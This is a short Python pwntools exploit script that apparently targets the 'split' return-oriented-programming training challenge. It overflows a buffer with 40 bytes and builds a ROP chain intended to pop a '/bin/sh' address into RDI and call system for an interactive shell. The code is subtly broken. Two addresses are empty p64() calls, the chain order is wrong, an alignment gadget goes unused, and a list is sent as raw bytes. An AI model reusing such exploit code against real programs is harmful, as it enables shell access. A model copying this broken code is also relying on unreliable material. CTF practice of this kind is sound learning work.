from pwn import *

chall = "./split"

context.binary = chall
context.bits = 64

pop_rdi = p64(0x4007c3)
stack_alignment = p64(0x40053e)
bash_string = p64()
system_call = p64()

offset = 40 * b'A'

# Put the bin/sh address on the stack, pop it into RDI, then call system with the string in RDI to supply it as the argument

payload = [
    offset,
    bash_string,
    pop_rdi,
    system_call
]

p = process([chall])

p.recvuntil(b'A')

p.sendline(payload)
p.interactive()